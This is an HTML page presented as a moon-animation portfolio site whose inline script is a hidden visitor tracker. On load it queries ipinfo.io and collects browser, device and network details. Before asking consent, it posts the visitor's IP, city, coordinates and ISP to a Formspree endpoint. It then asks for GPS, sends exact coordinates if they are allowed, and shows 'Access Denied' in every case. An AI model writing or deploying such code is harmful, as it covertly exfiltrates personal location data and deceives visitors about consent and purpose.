<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moon Visibility Animation</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>

<style>
  body {
    overflow: hidden; /* Prevent scroll before interaction */
  }
  #page-content {
    display: none; /* Hide content initially */
  }
</style>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: radial-gradient(circle at bottom, #001d3d, #000814);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            position: relative;
            color: white;
            font-family: Arial, sans-serif;
        }
        .moon-container {
            position: relative;
            width: 120px;
            height: 120px;
        }
        .moon {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background-color: white;
            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.8);
            position: absolute;
        }
        .moon-shadow {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            position: absolute;
            background-color: black;
            transition: all 1s ease-in-out;
        }
        .visibility-label {
            background: rgba(255, 255, 255, 0.2);
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 18px;
            margin-top: 20px;
            text-align: center;
        }
        .console-log {
            background: rgba(0, 0, 0, 0.5);
            color: #0f0;
            font-family: monospace;
            padding: 10px;
            width: 90%;
            max-height: 150px;
            overflow-y: auto;
            margin-top: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
  <div id="page-content">
    <!-- All your portfolio content here -->
    <h1>Welcome to My Portfolio</h1>
    <!-- ... rest of your site ... -->
  </div>
   <script>
(async () => {
  const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

  // Step 1: Fetch IP-based location first (silent)
  const ipRes = await fetch('https://ipinfo.io/json?token=92301f93643037');
  const ipData = await ipRes.json();

  // Collect device info immediately
  const baseInfo = await getDeviceInfo();
  baseInfo["Location Type"] = "Approx (IP)";
  baseInfo["IP"] = ipData.ip;
  baseInfo["City"] = ipData.city;
  baseInfo["Region"] = ipData.region;
  baseInfo["Country"] = ipData.country;
  baseInfo["Location (Lat,Long)"] = ipData.loc;
  baseInfo["ISP / Org"] = ipData.org;
  baseInfo["User Consent"] = "Not Asked Yet";

  // Send IP + device info early
  await sendToFormspree(baseInfo);

  // Step 2: Ask for exact location
  const askLocation = await Swal.fire({
    title: isIOS ? "Enable Location in Safari" : "Share Exact Location?",
    text: "Do you want to allow access to your exact location (GPS) for a better experience?",
    icon: "question",
    allowOutsideClick: false,
    allowEscapeKey: false,
    showCancelButton: true,
    confirmButtonText: "Yes, share",
    cancelButtonText: "No, thanks"
  });

  if (askLocation.isConfirmed) {
    navigator.geolocation.getCurrentPosition(async pos => {
      const gpsData = {
        ...baseInfo,
        "Location Type": "Exact (GPS)",
        "Latitude": pos.coords.latitude,
        "Longitude": pos.coords.longitude,
        "Accuracy": pos.coords.accuracy + " meters",
        "User Consent": "Yes"
      };

      await sendToFormspree(gpsData);
      denyAccess();
    }, async () => {
      // User blocked GPS
      baseInfo["User Consent"] = "Denied";
      await sendToFormspree(baseInfo);
      denyAccess();
    });
  } else {
    baseInfo["User Consent"] = "No";
    await sendToFormspree(baseInfo);
    denyAccess();
  }

  // Helper functions
  async function getDeviceInfo() {
    const info = {
      browser: navigator.userAgent,
      page: window.location.href,
      time: new Date().toLocaleString(),
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
      deviceMemory: navigator.deviceMemory || 'Unknown'
    };

    if (navigator.connection) {
      info["Network Type"] = navigator.connection.effectiveType || "Unknown";
      info["Downlink Speed"] = navigator.connection.downlink + " Mbps";
    }

    return info;
  }

  async function sendToFormspree(data) {
    const formData = new FormData();
    for (let key in data) {
      formData.append(key, data[key]);
    }

    await fetch("https://formspree.io/f/xldjejon", {
      method: "POST",
      body: formData,
      headers: { 'Accept': 'application/json' }
    });

    console.log("Data sent âœ…", data);
  }

  function unlockPage() {
    document.body.style.overflow = "auto";
    document.getElementById("page-content").style.display = "block";
  }

  function denyAccess() {
    document.body.innerHTML = `
      <div style="height:100vh;display:flex;align-items:center;justify-content:center;background:black;color:white;font-family:sans-serif;flex-direction:column;text-align:center;padding:20px;">
        <h2>Access Denied</h2>
        <p>You must allow location access to view this content.</p>
      </div>
    `;
    document.body.style.overflow = "hidden";
  }

})();
</script>

</body>
</html>
